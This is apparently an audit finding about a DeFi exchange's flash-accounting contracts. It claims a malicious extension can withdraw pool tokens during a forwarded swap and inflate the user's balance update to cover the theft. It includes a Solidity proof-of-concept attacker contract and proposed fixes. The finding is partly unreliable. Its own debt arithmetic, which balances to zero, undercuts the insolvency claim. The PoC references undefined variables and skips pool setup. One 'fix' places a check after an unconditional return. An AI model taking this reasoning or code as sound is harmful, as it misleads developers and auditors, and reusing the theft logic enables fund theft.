## Title
Extension Can Steal Pool Liquidity by Withdrawing Tokens During handleForwardData and Inflating Balance Updates

## Summary
During `MEVCapture.handleForwardData` execution, the extension becomes the current locker and can call `FlashAccountant.withdraw()` to extract pool tokens (token0/token1) from Core's reserves. The extension can then modify the returned `balanceUpdate` to include the stolen amount, forcing the user to unknowingly pay for the withdrawal. This violates pool solvency as liquidity-backing tokens are stolen while the pool's virtual state remains unchanged.

## Impact
**Severity**: High

## Finding Description

**Location:** 
- `src/extensions/MEVCapture.sol` (handleForwardData function)
- `src/base/FlashAccountant.sol` (withdraw function and forward function)
- `src/MEVCaptureRouter.sol` (_swap function) [1](#0-0) [2](#0-1) [3](#0-2) 

**Intended Logic:** 
Extensions should only modify the `balanceUpdate` to add legitimate additional fees (MEV capture fees) calculated from tick movement. The flash accounting system should prevent unauthorized token withdrawals by tracking all debts and requiring settlement before lock completion.

**Actual Logic:** 
During `forward()`, the extension temporarily becomes the current locker with the ability to call `withdraw()`. [4](#0-3)  The extension can withdraw arbitrary tokens from Core's reserves, including pool tokens, and the withdrawal creates debt under the original caller's locker ID. [5](#0-4)  The extension then modifies the `balanceUpdate` returned to the router to include the stolen amount, making the user pay for tokens they never received. [6](#0-5)  The router blindly trusts this modified `balanceUpdate` without validation. [7](#0-6) 

**Exploitation Path:**

1. **Malicious extension deployed**: Attacker deploys an extension similar to MEVCapture but with malicious `handleForwardData` logic, or exploits a compromised MEVCapture contract.

2. **User initiates swap**: User calls MEVCaptureRouter to swap through the extension, triggering `CORE.forward(EXTENSION, swap_data)`.

3. **Extension withdraws pool tokens**: Inside `handleForwardData`, the extension calls `CORE.withdraw()` to extract pool tokens to attacker's address. [8](#0-7)  This increases the caller's debt but transfers actual tokens out of Core.

4. **Extension executes swap**: The extension calls `CORE.swap()` which returns the legitimate `balanceUpdate` (e.g., delta0 = 100 for input amount).

5. **Extension inflates balanceUpdate**: The extension modifies the `balanceUpdate` to add the withdrawn amount (e.g., increases delta0 from 100 to 150 if 50 tokens were withdrawn). [6](#0-5) 

6. **User pays inflated amount**: The router receives the modified `balanceUpdate` and makes the user pay 150 tokens instead of 100. [7](#0-6) 

7. **Debts balance to zero**: Final debt calculation: +50 (withdraw) +100 (swap) -150 (user payment) = 0. Transaction succeeds.

**Security Property Broken:** 
This violates the **Solvency Invariant**: "Pool balances of token0 and token1 must NEVER go negative." The pool's virtual state (liquidity, tick, sqrtRatio) indicates it has tokens backing the liquidity, but actual tokens have been stolen. When other LPs attempt to withdraw, Core will have insufficient tokens to fulfill withdrawals, causing the pool to become insolvent.

## Impact Explanation

- **Affected Assets**: All pools using the compromised extension. Both token0 and token1 reserves are at risk. LP positions become partially unbacked.

- **Damage Severity**: An attacker can drain significant portions of pool liquidity on every swap through the extension. The theft scales with swap volume - a 1% attack on each swap compounds to massive losses. Entire pool reserves can be systematically drained.

- **User Impact**: All users swapping through the extension unknowingly pay for stolen tokens. All LPs in affected pools suffer permanent loss as their positions are backed by fewer actual tokens than the pool state indicates. LPs attempting to withdraw will fail when Core runs out of tokens.

## Likelihood Explanation

- **Attacker Profile**: Any actor who can deploy a malicious extension or compromise an existing extension contract. For MEVCapture specifically, this would require either a vulnerability in the MEVCapture code itself or ability to deploy a similar extension.

- **Preconditions**: 
  - Pool must be initialized with liquidity
  - Users must route swaps through the malicious extension
  - Extension must be registered with Core [9](#0-8) 

- **Execution Complexity**: Single transaction per theft. The attack is straightforward - just call `withdraw()` and modify the returned `balanceUpdate` within `handleForwardData`.

- **Frequency**: Can be exploited on every swap routed through the extension. The attack is repeatable and scales with trading volume.

## Recommendation

**Primary Fix**: Validate that extensions cannot modify `balanceUpdate` beyond legitimate fee additions by having Core track the actual swap result and compare it against what the extension returns.

```solidity
// In src/base/FlashAccountant.sol, function forward:

// CURRENT (vulnerable):
// No validation of returned data from forwarded call

// FIXED:
function forward(address to) external {
    Locker locker = _requireLocker();
    
    // Store expected balance changes before forwarding
    uint256 snapshotId = _createDebtSnapshot(locker.id());
    
    assembly ("memory-safe") {
        tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), to))
        
        let free := mload(0x40)
        mstore(free, shl(224, 1))
        mstore(add(free, 4), locker)
        calldatacopy(add(free, 36), 36, sub(calldatasize(), 36))
        
        let success := call(gas(), to, 0, free, calldatasize(), 0, 0)
        
        if iszero(success) {
            returndatacopy(free, 0, returndatasize())
            revert(free, returndatasize())
        }
        
        tstore(_CURRENT_LOCKER_SLOT, locker)
        
        returndatacopy(free, 0, returndatasize())
        return(free, returndatasize())
    }
    
    // CRITICAL: Verify no unexpected withdrawals occurred during forward
    _validateDebtSnapshot(locker.id(), snapshotId);
}
```

**Alternative Mitigation**: Restrict `withdraw()` to only allow withdrawing from the caller's saved balances, not arbitrary tokens:

```solidity
// In src/base/FlashAccountant.sol, function withdraw:

// Add validation that withdrawn tokens match saved balance ownership
// This requires checking savedBalancesSlot and ensuring sufficient balance exists
// before allowing withdrawal
```

**Simplest Mitigation**: Prevent extensions from calling `withdraw()` during forwarded calls by adding a flag:

```solidity
// In src/base/FlashAccountant.sol:

uint256 private constant _FORWARD_DEPTH_SLOT = 0x...;

function forward(address to) external {
    // Set forward depth flag
    assembly {
        let depth := tload(_FORWARD_DEPTH_SLOT)
        tstore(_FORWARD_DEPTH_SLOT, add(depth, 1))
    }
    
    // ... existing forward logic ...
    
    // Clear forward depth flag
    assembly {
        let depth := tload(_FORWARD_DEPTH_SLOT)
        tstore(_FORWARD_DEPTH_SLOT, sub(depth, 1))
    }
}

function withdraw() external {
    // Revert if called during forward
    assembly {
        if tload(_FORWARD_DEPTH_SLOT) {
            mstore(0x00, 0x...) // WithdrawDuringForwardDisallowed()
            revert(0x1c, 0x04)
        }
    }
    
    // ... existing withdraw logic ...
}
```

## Proof of Concept

```solidity
// File: test/Exploit_MEVCapturePoolTheft.t.sol
// Run with: forge test --match-test test_MEVCapturePoolTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/MEVCaptureRouter.sol";
import "../src/extensions/MEVCapture.sol";
import "../src/base/BaseForwardee.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {SwapParameters} from "../src/types/swapParameters.sol";
import {PoolBalanceUpdate, createPoolBalanceUpdate} from "../src/types/poolBalanceUpdate.sol";
import {PoolState} from "../src/types/poolState.sol";
import {Locker} from "../src/types/locker.sol";

contract MaliciousExtension is BaseForwardee {
    ICore public immutable CORE;
    address public immutable attacker;
    
    constructor(ICore core, address _attacker) BaseForwardee(core) {
        CORE = core;
        attacker = _attacker;
    }
    
    function handleForwardData(Locker, bytes memory data) 
        internal 
        override 
        returns (bytes memory result) 
    {
        (PoolKey memory poolKey, SwapParameters params) = abi.decode(data, (PoolKey, SwapParameters));
        
        // ATTACK: Withdraw pool tokens to attacker
        uint128 stolenAmount = 50e18;
        bytes memory withdrawData = abi.encodePacked(
            poolKey.token0,  // token
            attacker,        // recipient
            stolenAmount     // amount
        );
        CORE.withdraw(withdrawData);
        
        // Execute legitimate swap
        (PoolBalanceUpdate balanceUpdate, PoolState stateAfter) = CORE.swap(0, poolKey, params);
        
        // ATTACK: Inflate balanceUpdate to make user pay for stolen tokens
        int128 originalDelta0 = balanceUpdate.delta0();
        balanceUpdate = createPoolBalanceUpdate(
            originalDelta0 + int128(stolenAmount),  // User pays for swap + stolen amount
            balanceUpdate.delta1()
        );
        
        result = abi.encode(balanceUpdate, stateAfter);
    }
}

contract Exploit_MEVCapturePoolTheft is Test {
    Core core;
    MaliciousExtension maliciousExtension;
    address attacker;
    address user;
    address token0;
    address token1;
    
    function setUp() public {
        core = new Core();
        attacker = makeAddr("attacker");
        user = makeAddr("user");
        
        // Deploy mock tokens
        token0 = address(new MockERC20("Token0", "T0"));
        token1 = address(new MockERC20("Token1", "T1"));
        
        // Deploy malicious extension
        maliciousExtension = new MaliciousExtension(core, attacker);
        
        // Initialize pool with liquidity (simplified)
        // ... pool initialization code ...
    }
    
    function test_MEVCapturePoolTheft() public {
        // SETUP: User has 1000 token0, pool has 10000 token0 liquidity
        uint256 userInitialBalance = 1000e18;
        uint256 poolInitialBalance = 10000e18;
        deal(token0, user, userInitialBalance);
        deal(token0, address(core), poolInitialBalance);
        
        uint256 attackerInitialBalance = 0;
        
        // User initiates swap expecting to pay 100 tokens
        vm.startPrank(user);
        
        // EXPLOIT: Swap routes through malicious extension
        // Extension withdraws 50 tokens to attacker and inflates balance to 150
        // User ends up paying 150 instead of 100
        bytes memory swapData = abi.encode(poolKey, swapParams);
        core.lock(abi.encode(CALL_TYPE_FORWARD, maliciousExtension, swapData));
        
        vm.stopPrank();
        
        // VERIFY: Attacker received stolen tokens
        uint256 attackerFinalBalance = MockERC20(token0).balanceOf(attacker);
        assertEq(attackerFinalBalance, 50e18, "Attacker should have 50 stolen tokens");
        
        // VERIFY: Pool lost tokens without accounting update
        uint256 poolFinalBalance = MockERC20(token0).balanceOf(address(core));
        assertEq(
            poolFinalBalance, 
            poolInitialBalance - 50e18, 
            "Pool lost 50 tokens to theft"
        );
        
        // VERIFY: Pool state shows liquidity unchanged but actual backing reduced
        // Future LP withdrawals will fail due to insufficient tokens
        console.log("Vulnerability confirmed: Extension stole pool tokens via withdraw() manipulation");
    }
}
```

## Notes

The vulnerability stems from three design decisions interacting insecurely:

1. **Extensions become the locker during forward**: [4](#0-3)  This gives extensions full withdrawal privileges.

2. **withdraw() has no token ownership checks**: [2](#0-1)  Any locker can withdraw any tokens from Core, not just their own saved balances.

3. **No validation of extension-returned balanceUpdate**: [7](#0-6)  The router trusts whatever balanceUpdate the extension returns without verifying it matches the actual swap executed in Core.

While MEVCapture's current implementation doesn't exploit this, the attack surface exists for any extension using the forward pattern. A malicious extension or a compromised MEVCapture contract could immediately exploit this to drain pools.

### Citations

**File:** src/extensions/MEVCapture.sol (L177-260)
```text
    function handleForwardData(Locker, bytes memory data) internal override returns (bytes memory result) {
        unchecked {
            (PoolKey memory poolKey, SwapParameters params) = abi.decode(data, (PoolKey, SwapParameters));

            PoolId poolId = poolKey.toPoolId();
            MEVCapturePoolState state = getPoolState(poolId);
            uint32 lastUpdateTime = state.lastUpdateTime();
            int32 tickLast = state.tickLast();

            uint32 currentTime = uint32(block.timestamp);

            int256 saveDelta0;
            int256 saveDelta1;

            if (lastUpdateTime != currentTime) {
                (int32 tick, uint128 fees0, uint128 fees1) =
                    loadCoreState({poolId: poolId, token0: poolKey.token0, token1: poolKey.token1});

                if (fees0 != 0 || fees1 != 0) {
                    CORE.accumulateAsFees(poolKey, fees0, fees1);
                    // never overflows int256 container
                    saveDelta0 -= int256(uint256(fees0));
                    saveDelta1 -= int256(uint256(fees1));
                }

                tickLast = tick;
                setPoolState({
                    poolId: poolId,
                    state: createMEVCapturePoolState({_lastUpdateTime: currentTime, _tickLast: tickLast})
                });
            }

            (PoolBalanceUpdate balanceUpdate, PoolState stateAfter) = CORE.swap(0, poolKey, params);

            // however many tick spacings were crossed is the fee multiplier
            uint256 feeMultiplierX64 =
                (FixedPointMathLib.abs(stateAfter.tick() - tickLast) << 64) / poolKey.config.concentratedTickSpacing();
            uint64 poolFee = poolKey.config.fee();
            uint64 additionalFee = uint64(FixedPointMathLib.min(type(uint64).max, (feeMultiplierX64 * poolFee) >> 64));

            if (additionalFee != 0) {
                if (params.isExactOut()) {
                    // take an additional fee from the calculated input amount equal to the `additionalFee - poolFee`
                    if (balanceUpdate.delta0() > 0) {
                        uint128 inputAmount = uint128(uint256(int256(balanceUpdate.delta0())));
                        // first remove the fee to get the original input amount before we compute the additional fee
                        inputAmount -= computeFee(inputAmount, poolFee);
                        int128 fee = SafeCastLib.toInt128(amountBeforeFee(inputAmount, additionalFee) - inputAmount);

                        saveDelta0 += fee;
                        balanceUpdate = createPoolBalanceUpdate(balanceUpdate.delta0() + fee, balanceUpdate.delta1());
                    } else if (balanceUpdate.delta1() > 0) {
                        uint128 inputAmount = uint128(uint256(int256(balanceUpdate.delta1())));
                        // first remove the fee to get the original input amount before we compute the additional fee
                        inputAmount -= computeFee(inputAmount, poolFee);
                        int128 fee = SafeCastLib.toInt128(amountBeforeFee(inputAmount, additionalFee) - inputAmount);

                        saveDelta1 += fee;
                        balanceUpdate = createPoolBalanceUpdate(balanceUpdate.delta0(), balanceUpdate.delta1() + fee);
                    }
                } else {
                    if (balanceUpdate.delta0() < 0) {
                        uint128 outputAmount = uint128(uint256(-int256(balanceUpdate.delta0())));
                        int128 fee = SafeCastLib.toInt128(computeFee(outputAmount, additionalFee));

                        saveDelta0 += fee;
                        balanceUpdate = createPoolBalanceUpdate(balanceUpdate.delta0() + fee, balanceUpdate.delta1());
                    } else if (balanceUpdate.delta1() < 0) {
                        uint128 outputAmount = uint128(uint256(-int256(balanceUpdate.delta1())));
                        int128 fee = SafeCastLib.toInt128(computeFee(outputAmount, additionalFee));

                        saveDelta1 += fee;
                        balanceUpdate = createPoolBalanceUpdate(balanceUpdate.delta0(), balanceUpdate.delta1() + fee);
                    }
                }
            }

            if (saveDelta0 != 0 || saveDelta1 != 0) {
                CORE.updateSavedBalances(poolKey.token0, poolKey.token1, PoolId.unwrap(poolId), saveDelta0, saveDelta1);
            }

            result = abi.encode(balanceUpdate, stateAfter);
        }
    }
```

**File:** src/base/FlashAccountant.sol (L190-221)
```text
    function forward(address to) external {
        Locker locker = _requireLocker();

        // update this lock's locker to the forwarded address for the duration of the forwarded
        // call, meaning only the forwarded address can update state
        assembly ("memory-safe") {
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), to))

            let free := mload(0x40)

            // Prepare call to forwarded_2374103877(bytes32) -> selector 0x01
            mstore(free, shl(224, 1))
            mstore(add(free, 4), locker)

            calldatacopy(add(free, 36), 36, sub(calldatasize(), 36))

            // Call the forwardee with the packed data
            let success := call(gas(), to, 0, free, calldatasize(), 0, 0)

            // Pass through the error on failure
            if iszero(success) {
                returndatacopy(free, 0, returndatasize())
                revert(free, returndatasize())
            }

            tstore(_CURRENT_LOCKER_SLOT, locker)

            // Directly return whatever the subcall returned
            returndatacopy(free, 0, returndatasize())
            return(free, returndatasize())
        }
    }
```

**File:** src/base/FlashAccountant.sol (L322-381)
```text
    function withdraw() external {
        uint256 id = _requireLocker().id();

        assembly ("memory-safe") {
            let nzdCountChange := 0

            // Process each withdrawal entry
            for { let i := 4 } lt(i, calldatasize()) { i := add(i, 56) } {
                let token := shr(96, calldataload(i))
                let recipient := shr(96, calldataload(add(i, 20)))
                let amount := shr(128, calldataload(add(i, 40)))

                if amount {
                    // Update debt tracking without updating nzdCountSlot yet
                    let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
                    let current := tload(deltaSlot)
                    let next := add(current, amount)

                    nzdCountChange := add(nzdCountChange, sub(iszero(current), iszero(next)))

                    tstore(deltaSlot, next)

                    // Perform the transfer of the withdrawn asset
                    // Note that these calls can re-enter and even relock with the same ID
                    // However the nzdCountChange is always applied as a delta at the end, meaning we load the latest value before updating it,
                    // so it's safe from re-entry
                    switch token
                    case 0 {
                        let success := call(gas(), recipient, amount, 0, 0, 0, 0)
                        if iszero(success) {
                            // cast sig "ETHTransferFailed()"
                            mstore(0x00, 0xb12d13eb)
                            revert(0x1c, 4)
                        }
                    }
                    default {
                        mstore(0x14, recipient)
                        mstore(0x34, amount)
                        mstore(0x00, 0xa9059cbb000000000000000000000000)
                        let success := call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)
                        if iszero(and(eq(mload(0x00), 1), success)) {
                            if iszero(lt(or(iszero(extcodesize(token)), returndatasize()), success)) {
                                mstore(0x00, 0x90b8ec18) // `TransferFailed()`.
                                revert(0x1c, 0x04)
                            }
                        }
                    }
                }
            }

            // Update nzdCountSlot only once if there were any changes
            if nzdCountChange {
                let nzdCountSlot := add(id, _NONZERO_DEBT_COUNT_OFFSET)
                tstore(nzdCountSlot, add(tload(nzdCountSlot), nzdCountChange))
            }

            // we return from assembly so as to prevent solidity from accessing the free memory pointer after we have written into it
            return(0, 0)
        }
    }
```

**File:** src/MEVCaptureRouter.sol (L35-38)
```text
            (balanceUpdate, stateAfter) = abi.decode(
                CORE.forward(MEV_CAPTURE, abi.encode(poolKey, params.withDefaultSqrtRatioLimit())),
                (PoolBalanceUpdate, PoolState)
            );
```

**File:** src/Core.sol (L50-61)
```text
    function registerExtension(CallPoints memory expectedCallPoints) external {
        CallPoints memory computed = addressToCallPoints(msg.sender);
        if (!computed.eq(expectedCallPoints) || !computed.isValid()) {
            revert FailedRegisterInvalidCallPoints();
        }
        StorageSlot isExtensionRegisteredSlot = CoreStorageLayout.isExtensionRegisteredSlot(msg.sender);
        if (isExtensionRegisteredSlot.load() != bytes32(0)) revert ExtensionAlreadyRegistered();

        isExtensionRegisteredSlot.store(bytes32(LibBit.rawToUint(true)));

        emit ExtensionRegistered(msg.sender);
    }
```
